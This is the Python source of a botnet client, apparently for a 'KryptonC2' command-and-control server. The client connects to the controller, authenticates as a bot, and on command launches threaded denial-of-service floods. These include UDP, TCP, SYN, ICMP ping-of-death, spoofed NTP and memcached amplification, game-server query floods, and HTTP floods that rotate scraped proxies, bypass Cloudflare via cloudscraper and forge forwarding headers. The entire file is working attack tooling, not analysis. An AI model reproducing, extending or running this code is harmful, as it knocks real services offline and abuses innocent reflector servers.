import socket, threading, time, random, cloudscraper, requests, struct, os, sys, socks, ssl
from struct import pack as data_pack
from multiprocessing import Process
from urllib.parse import urlparse
from scapy.all import IP, UDP, Raw, ICMP, send
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from typing import Any, List, Set, Tuple
from uuid import UUID, uuid4
from icmplib import ping as pig
from scapy.layers.inet import UDP
    
KRYPTONC2_ADDRESS  = "localhost"
KRYPTONC2_PORT  = 5511

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36'
]

def rand_ua():
    chosen_user_agent = random.choice(base_user_agents)
    return chosen_user_agent.format(
        random.random() + 5,
        random.random() + random.randint(1, 8),
        random.random(),
        random.randint(2000, 2100),
        random.randint(92215, 99999),
        random.random() + random.randint(3, 9)
    )


ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
def NTP(target, port, timer):
    try:
        with open("ntpServers.txt", "r") as f:
            ntp_servers = f.readlines()
        packets = random.randint(10, 150)
    except Exception as e:
        print(f"Erro: {e}")
        pass

    server = random.choice(ntp_servers).strip()
    while time.time() < timer:
        try:
            packet = (
                    IP(dst=server, src=target)
                    / UDP(sport=random.randint(1, 65535), dport=int(port))
                    / Raw(load=ntp_payload)
            )
            try:
                for _ in range(50000000):
                    send(packet, count=packets, verbose=False)
                    #print('NTP SEND')
            except Exception as e:
               # print(f"Erro: {e}")
                pass
        except Exception as e:
            #print(f"Erro: {e}")
            pass

mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
def MEM(target, port, timer):
    packets = random.randint(1024, 60000)
    try:
        with open("memsv.txt", "r") as f:
            memsv = f.readlines()
    except:
        #print('Erro')
        pass
    server = random.choice(memsv).strip()
    while time.time() < timer:
        try:
            try:
                packet = (
                        IP(dst=server, src=target)
                        / UDP(sport=port, dport=11211)
                        / Raw(load=mem_payload)
                )
                for _ in range(5000000):
                    send(packet, count=packets, verbose=False)
            except:
                pass
        except:
            pass

def icmp(target, timer):
    while time.time() < timer:
        try:
            for _ in range(5000000):
                packet = random._urandom(int(random.randint(1024, 60000)))
                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
                #print('MEMCACHED SEND')
        except:
            pass

def pod(target, timer):
    while time.time() < timer:
        try:
            rand_addr = spoofer()
            ip_hdr = IP(src=rand_addr, dst=target)
            packet = ip_hdr / ICMP() / ("m" * 60000)
            send(packet)
        except:
            pass


# old methods --------------------->
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

def httpSpoofAttack(url, timer):
    timeout = time.time() + int(timer)
    proxies = open("socks4.txt").readlines()
    proxy = random.choice(proxies).strip().split(":")
    req =  "GET "+"/"+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
    req += "Via: "+spoofer()+"\r\n"
    req += "Client-IP: "+spoofer()+"\r\n"
    req += "X-Forwarded-For: "+spoofer()+"\r\n"
    req += "Real-IP: "+spoofer()+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timeout:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            try:
                for i in range(5000000000):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()


def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        headers = {'User-Agent': rand_ua()}
        
        try:
            response = proxiedRequest.get(target, headers=headers)

            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)

    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}

        try:
            a = scraper.get(target, headers=headers, proxies=proxies, timeout=15)

            if a.status_code >= 200 and a.status_code <= 226:
                for _ in range(100):
                    scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            proxies = remove_by_value(proxies, proxy)
    
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()

        try:
            a = scraper.get(target, headers=headers, timeout=15)
        except:
            pass

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)

def httpio(target, times, threads, attack_type):
    proxies = []
    if attack_type == 'PROXY' or attack_type == 'proxy':
        cfbp = 0
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass

    elif attack_type == 'NORMAL' or attack_type == 'normal':
        cfbp = 1
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
    time.sleep(times)
    
    for p in processes:
        os.kill(p.pid, 9)

def CFB(url, port, secs):
    url = url + ":" + port
    while time.time() < secs:

        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        for _ in range(1500):
            scraper.get(url, headers=headers, timeout=15)
            scraper.head(url, headers=headers, timeout=15)

def STORM_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:

        random_list = random.choice(("FakeUser", "User"))
        headers = ""
        if "FakeUser" in random_list:
            headers = {'User-Agent': rand_ua()}
        else:
            headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            requests.head(ip, headers=headers)
            scraper.get(ip, headers=headers)

def GET_attack(ip, port, secs):
    ip = ip + ":" + port
    scraper = cloudscraper.create_scraper()
    scraper = cloudscraper.CloudScraper()
    s = requests.Session()
    while time.time() < secs:
        headers = {'User-Agent': rand_ua()}
        for _ in range(1500):
            requests.get(ip, headers=headers)
            scraper.get(ip, headers=headers)

def attack_udp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))

def attack_tcp(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((ip, port))
            while time.time() < secs:
                s.send(random._urandom(size))
        except:
            pass

def attack_SYN(ip, port, secs):
    
    while time.time() < secs:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        flags = 0b01000000
        
        try:
            s.connect((ip, port))
            pkt = struct.pack('!HHIIBBHHH', 1234, 5678, 0, 1234, flags, 0, 0, 0, 0)
            
            while time.time() < secs:
                s.send(pkt)
        except:
            s.close()

def attack_tup(ip, port, secs, size):
    while time.time() < secs:
        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dport = random.randint(1, 65535) if port == 0 else port
        try:
            data = random._urandom(size)
            tcp.connect((ip, port))
            udp.sendto(data, (ip, dport))
            tcp.send(data)
            print('Pacote TUP Enviado')
        except:
            pass

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def attack_vse(ip, port, secs):
    payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                b'\x20\x51\x75\x65\x72\x79\x00') # Read more here > https://developer.valvesoftware.com/wiki/Server_queries    
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))


def attack_roblox(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex = "%064x" % ran
            hex = hex[:64]
            s.sendto(bytes.fromhex(hex) + bytes, (ip, dport))

def attack_junk(ip, port, secs):
    payload = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))
        s.sendto(payload, (ip, port))

def main():
        c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        while 1:
            try:
                c2.connect((KRYPTONC2_ADDRESS, KRYPTONC2_PORT))
                while 1:
                    c2.send('669787761736865726500'.encode())
                    break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Username' in data:
                        c2.send('BOT'.encode())
                        break
                while 1:
                    time.sleep(1)
                    data = c2.recv(1024).decode()
                    if 'Password' in data:
                        c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                        break
                break
            except:
                time.sleep(5)
        while 1:
            try:
                data = c2.recv(1024).decode().strip()
                if not data:
                    break
                args = data.split(' ')
                command = args[0].upper()

                if command == '.UDP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.TCP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.NTP':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=NTP, args=(ip, port, timer), daemon=True).start()

                elif command == '.MEM':
                    ip = args[1]
                    port = int(args[2])
                    timer = time.time() + int(args[3])
                    threads = int(args[4])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=MEM, args=(ip, port, timer), daemon=True).start()

                elif command == '.ICMP':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=icmp, args=(ip, timer), daemon=True).start()

                elif command == '.POD':
                    ip = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    #event = threading.Event()

                    for _ in range(threads):
                        threading.Thread(target=pod, args=(ip, timer), daemon=True).start()

                elif command == '.TUP':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_tup, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.HEX':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_hex, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.ROBLOX':
                        ip = args[1]
                        port = int(args[2])
                        secs = time.time() + int(args[3])
                        size = int(args[4])
                        threads = int(args[5])

                        for _ in range(threads):
                            threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
                
                elif command == '.VSE':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_vse, args=(ip, port, secs), daemon=True).start()
                
                elif command == '.JUNK':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    size = int(args[4])
                    threads = int(args[5])

                    for _ in range(threads):
                        threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                        threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                        threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()

                elif command == '.SYN':
                    ip = args[1]
                    port = int(args[2])
                    secs = time.time() + int(args[3])
                    threads = int(args[4])

                    for _ in range(threads):
                        threading.Thread(target=attack_SYN, args=(ip, port, secs), daemon=True).start()
                
                elif command == ".HTTPSTORM":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        threading.Thread(target=STORM_attack, args=(url, port, secs), daemon=True).start()

                elif command == ".HTTPGET":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        threading.Thread(target=GET_attack, args=(url,port,secs), daemon=True).start()
                
                elif command == ".HTTPCFB":
                    url = args[1]
                    port = args[2]
                    secs = time.time() + int(args[3])
                    threads = int(args[4])
                    for _ in range(threads):
                        threading.Thread(target=CFB, args=(url,port,secs), daemon=True).start()

                elif command == ".HTTPIO":
                    url = args[1]
                    secs = int(args[2])
                    threads = int(args[3])
                    attackType = args[4]
                    #threads = int(args[5])
                    
                    threading.Thread(target=httpio, args=(url, secs, threads, attackType), daemon=True).start()

                elif command == ".HTTPSPOOF":
                    url = args[1]
                    timer = time.time() + int(args[2])
                    threads = int(args[3])
                    
                    for _ in range(threads):
                        threading.Thread(target=httpSpoofAttack, args=(url, timer), daemon=True).start()
                
                elif command == 'PING':
                    c2.send('PONG'.encode())

            except:
                break

        c2.close()

        main()

if __name__ == '__main__':
        try:
            main()
        except:
            pass
